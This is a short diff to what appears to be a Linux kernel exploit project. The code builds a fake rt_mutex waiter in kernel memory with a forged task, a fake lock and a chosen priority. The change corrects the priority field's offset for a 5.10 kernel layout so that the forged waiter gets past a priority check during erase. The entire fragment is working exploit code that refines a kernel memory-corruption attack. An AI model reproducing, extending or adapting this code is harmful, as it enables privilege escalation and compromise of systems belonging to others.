@@ -397,8 +397,15 @@ namespace ghostlock::support {
                     *request, write_layout);
                 put64(p, kernel::W0_OFF + 0x30, waiter_task); /* task */
                 put64(p, kernel::W0_OFF + 0x38, (session::g_exploit_session.heap.current.fake_lock)); /* lock */
-                put32(p, kernel::W0_OFF + 0x40, 0); /* wake_state */
-                put32(p, kernel::W0_OFF + 0x44, kernel::FAKE_WAITER_PRIO); /* prio */
+                /* A flat 5.10 waiter puts prio at 0x40. Writing it at 0x44
+                 * leaves prio at 0 and fails the erase's prio > 120 gate. */
+                const uint32_t prio_off = session::g_exploit_session.profile
+                                                  .waiter_prio_offset(
+                                                          kernel::FAKE_WAITER_PRIO_OFF_SPLIT);
+                if (prio_off == kernel::FAKE_WAITER_PRIO_OFF_SPLIT) {
+                    put32(p, kernel::W0_OFF + 0x40, 0); /* wake_state */
+                }
+                put32(p, kernel::W0_OFF + prio_off, kernel::FAKE_WAITER_PRIO); /* prio */
                 put64(p, kernel::W0_OFF + 0x48, 0); /* deadline */
                 put64(p, kernel::W0_OFF + 0x50, 0); /* ww_ctx */
             } else {
